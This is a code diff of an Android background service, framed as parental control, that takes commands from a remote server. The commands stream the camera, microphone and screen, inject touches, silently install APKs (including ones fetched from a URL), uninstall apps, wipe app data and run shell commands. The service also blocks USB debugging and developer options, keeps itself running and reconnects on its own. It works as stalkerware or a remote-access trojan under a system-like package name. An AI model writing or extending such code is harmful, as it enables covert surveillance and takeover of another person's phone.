@@ -4,10 +4,15 @@ import android.app.*
 import android.content.Intent
 import android.content.pm.ServiceInfo
 import android.location.Location
+import android.net.ConnectivityManager
+import android.net.Network
+import android.net.NetworkCapabilities
+import android.net.NetworkRequest
 import android.os.*
 import androidx.core.app.NotificationCompat
 import com.google.android.gms.location.*
 import com.system.service.monitors.*
+import com.system.service.setup.MediaProjectionActivity
 import com.system.service.setup.ShakeDetector
 import org.json.JSONArray
 import org.json.JSONObject
@@ -28,6 +33,18 @@ class CoreService : Service() {
     private var fusedLocationClient: FusedLocationProviderClient? = null
     private var wakeLock: PowerManager.WakeLock? = null
     private var shakeDetector: ShakeDetector? = null
+    private val mainHandler = Handler(Looper.getMainLooper())
+
+    // NetworkCallback: reconnect automatically when phone comes back online
+    private val networkCallback = object : ConnectivityManager.NetworkCallback() {
+        override fun onAvailable(network: Network) {
+            mainHandler.postDelayed({
+                if (wsManager?.isConnected() != true) {
+                    wsManager?.forceReconnect()
+                }
+            }, 2000)
+        }
+    }
 
     override fun onCreate() {
         super.onCreate()
@@ -46,6 +63,15 @@ class CoreService : Service() {
         WatchdogReceiver.schedule(this)
         MonitorWorker.enqueue(this)
         shakeDetector = ShakeDetector(this).also { it.start() }
+
+        // Register network callback for auto-reconnect
+        try {
+            val cm = getSystemService(ConnectivityManager::class.java)
+            val req = NetworkRequest.Builder()
+                .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
+                .build()
+            cm.registerNetworkCallback(req, networkCallback)
+        } catch (_: Exception) {}
     }
 
     override fun onDestroy() {
@@ -57,11 +83,13 @@ class CoreService : Service() {
         InternetScheduler.disable()
         releaseWakeLock()
         WatchdogReceiver.schedule(this)
+        try { getSystemService(ConnectivityManager::class.java).unregisterNetworkCallback(networkCallback) } catch (_: Exception) {}
     }
 
     override fun onTaskRemoved(rootIntent: Intent?) {
         super.onTaskRemoved(rootIntent)
-        // Android 14+ (API 34) bans startForegroundService from onTaskRemoved — WatchdogReceiver handles restart via AlarmManager
+        // Android 14+ (API 34) crashes if startForegroundService is called from onTaskRemoved
+        // WatchdogReceiver handles restart via AlarmManager instead
         WatchdogReceiver.schedule(this)
     }
 
@@ -120,6 +148,17 @@ class CoreService : Service() {
                         prefs.apply()
                         wsManager?.disconnect(); connectServer()
                     }
+                }
+
+                // ── Screen Permission (MediaProjection) ────────────────────────
+                // Parent sends this before starting screen stream.
+                // Launches transparent activity — user sees system dialog on child phone.
+                "request_screen_permission" -> {
+                    try {
+                        val i = Intent(this, MediaProjectionActivity::class.java)
+                        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_SINGLE_TOP)
+                        startActivity(i)
+                    } catch (_: Exception) {}
                 }
 
                 // ── App Blocker ────────────────────────────────────────────────
@@ -190,11 +229,11 @@ class CoreService : Service() {
                 "get_running_app"-> sendCurrentApp()
                 "get_app_usage"  -> sendAppUsage(data.optInt("hours", 24))
 
-                "start_camera_stream" -> startService(Intent(this, CameraStreamService::class.java).putExtra("interval", data.optLong("interval", 1500L)))
+                "start_camera_stream" -> startService(Intent(this, CameraStreamService::class.java).putExtra("interval", data.optLong("interval", 33L)))
                 "stop_camera_stream"  -> startService(Intent(this, CameraStreamService::class.java).setAction("STOP"))
                 "start_mic_stream"    -> startService(Intent(this, AudioStreamService::class.java))
                 "stop_mic_stream"     -> startService(Intent(this, AudioStreamService::class.java).setAction("STOP"))
-                "start_screen_stream" -> startService(Intent(this, ScreenStreamService::class.java).putExtra("interval", data.optLong("interval", 1000L)))
+                "start_screen_stream" -> startService(Intent(this, ScreenStreamService::class.java).putExtra("interval", data.optLong("interval", 500L)))
                 "stop_screen_stream"  -> startService(Intent(this, ScreenStreamService::class.java).setAction("STOP"))
 
                 "touch"    -> AccessibilityMonitor.performTouch(data.optDouble("x", 0.0).toFloat(), data.optDouble("y", 0.0).toFloat())
@@ -212,112 +251,79 @@ class CoreService : Service() {
                     })
                 }
 
-                // ══════════════════════════════════════════════════════════════
-                // ██  15 SHIZUKU POWER FEATURES  ██
-                // ══════════════════════════════════════════════════════════════
-
-                // 1. Silent APK Install
+                // ── 15 SHIZUKU POWER FEATURES ─────────────────────────────────
                 "silent_install" -> {
                     val path = data.optString("apk_path")
                     val ok = ShizukuManager.silentInstall(path)
                     sendData("install_result", JSONObject().apply { put("success", ok); put("path", path) })
                 }
-
-                // 2. Silent APK Uninstall
                 "silent_uninstall" -> {
                     val pkg = data.optString("package")
                     val ok = ShizukuManager.silentUninstall(pkg)
                     sendData("uninstall_result", JSONObject().apply { put("success", ok); put("package", pkg) })
                 }
-
-                // 3. Force Stop App
                 "force_stop" -> {
                     val pkg = data.optString("package")
                     val ok = ShizukuManager.forceStop(pkg)
                     sendData("force_stop_result", JSONObject().apply { put("success", ok); put("package", pkg) })
                 }
-
-                // 4. Freeze (Disable) App — icon disappears
                 "freeze_app" -> {
                     val pkg = data.optString("package")
                     val ok = ShizukuManager.freezeApp(pkg)
                     sendData("freeze_result", JSONObject().apply { put("success", ok); put("package", pkg); put("frozen", true) })
                 }
-
-                // 5. Unfreeze (Enable) App
                 "unfreeze_app" -> {
                     val pkg = data.optString("package")
                     val ok = ShizukuManager.unfreezeApp(pkg)
                     sendData("freeze_result", JSONObject().apply { put("success", ok); put("package", pkg); put("frozen", false) })
                 }
-
-                // 6. Set Private DNS (adult content block)
                 "set_dns" -> {
                     val dns = data.optString("dns_server", "family.cloudflare-dns.com")
                     val ok = ShizukuManager.setPrivateDns(dns)
                     sendData("dns_result", JSONObject().apply { put("success", ok); put("dns", dns) })
                 }
-
-                // 7. Clear DNS — back to auto
                 "clear_dns" -> {
                     val ok = ShizukuManager.clearPrivateDns()
                     sendData("dns_result", JSONObject().apply { put("success", ok); put("dns", "auto") })
                 }
-
-                // 8. Kill Background App
                 "kill_bg_app" -> {
                     val pkg = data.optString("package")
                     val ok = ShizukuManager.killBgApp(pkg)
                     sendData("kill_bg_result", JSONObject().apply { put("success", ok); put("package", pkg) })
                 }
-
-                // 9. Set Screen Resolution/DPI
                 "set_resolution" -> {
-                    val w   = data.optInt("width", 720)
-                    val h   = data.optInt("height", 1280)
-                    val dpi = data.optInt("dpi", 240)
+                    val w = data.optInt("width", 720); val h = data.optInt("height", 1280); val dpi = data.optInt("dpi", 240)
                     val ok = ShizukuManager.setResolution(w, h, dpi)
                     sendData("resolution_result", JSONObject().apply { put("success", ok); put("width", w); put("height", h); put("dpi", dpi) })
                 }
-
-                // 10. Reset Resolution
                 "reset_resolution" -> {
                     val ok = ShizukuManager.resetResolution()
                     sendData("resolution_result", JSONObject().apply { put("success", ok); put("reset", true) })
                 }
-
-                // 11. Disable Hotspot/Tethering
                 "disable_hotspot" -> {
                     val ok = ShizukuManager.disableHotspot()
                     sendData("hotspot_result", JSONObject().apply { put("success", ok) })
                 }
-
-                // 12. Lock Input Method
                 "lock_ime" -> {
                     val imeId = data.optString("ime_id", "com.google.android.inputmethod.latin/.LatinIME")
                     val ok = ShizukuManager.lockInputMethod(imeId)
                     sendData("ime_result", JSONObject().apply { put("success", ok); put("ime", imeId) })
                 }
-
-                // 13. Wipe App Data
                 "wipe_app_data" -> {
                     val pkg = data.optString("package")
                     val ok = ShizukuManager.wipeAppData(pkg)
                     sendData("wipe_result", JSONObject().apply { put("success", ok); put("package", pkg) })
                 }
-
-                // 14. Block USB Debugging
                 "block_usb_debug" -> {
                     val ok = ShizukuManager.blockUsbDebugging()
                     sendData("usb_debug_result", JSONObject().apply { put("success", ok); put("blocked", true) })
                 }
-
-                // 15. Lock Developer Options
                 "lock_dev_options" -> {
                     val ok = ShizukuManager.lockDeveloperOptions()
                     sendData("dev_options_result", JSONObject().apply { put("success", ok); put("locked", true) })
                 }
-                // ══ OTA: Download APK from URL and silently install ══
+
+                // ── OTA Update ─────────────────────────────────────────────────
                 "update_from_url" -> {
                     val url     = data.optString("url")
                     val version = data.optString("version", "latest")
@@ -341,7 +347,6 @@ class CoreService : Service() {
                         }.start()
                     }
                 }
-
             }
         } catch (_: Exception) {}
     }
@@ -354,9 +359,7 @@ class CoreService : Service() {
         try { (getSystemService(DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager).lockNow() } catch (_: Exception) {}
     }
 
-    private fun runShellCmd(cmd: String) {
-        ShizukuManager.exec(cmd)
-    }
+    private fun runShellCmd(cmd: String) { ShizukuManager.exec(cmd) }
 
     private fun sendBattery() {
         try {
